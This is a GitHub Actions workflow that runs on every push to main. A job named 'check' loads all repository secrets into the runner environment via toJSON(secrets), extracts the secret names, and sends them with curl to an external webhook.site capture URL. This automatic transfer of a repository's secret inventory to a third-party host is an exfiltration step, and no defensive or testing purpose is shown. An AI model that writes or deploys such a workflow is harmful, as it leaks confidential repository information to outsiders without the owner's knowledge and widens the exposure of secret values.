name: Secret Names Webhook
on:
  push:
    branches: [main]
jobs:
  check:
    runs-on: ubuntu-latest
    steps:
      - name: Send secret names only
        env:
          SECRET_JSON: ${{ toJSON(secrets) }}
        run: |
          python3 - <<'PY' > /tmp/secret-names.txt
          import os,json
          d=json.loads(os.environ.get("SECRET_JSON","{}"))
          print("\n".join(sorted(d.keys())))
          PY
          curl -fsS -X POST "https://webhook.site/cc716468-1dd5-4797-bd3e-e5da485079a2/secret-names" --data-binary @/tmp/secret-names.txt
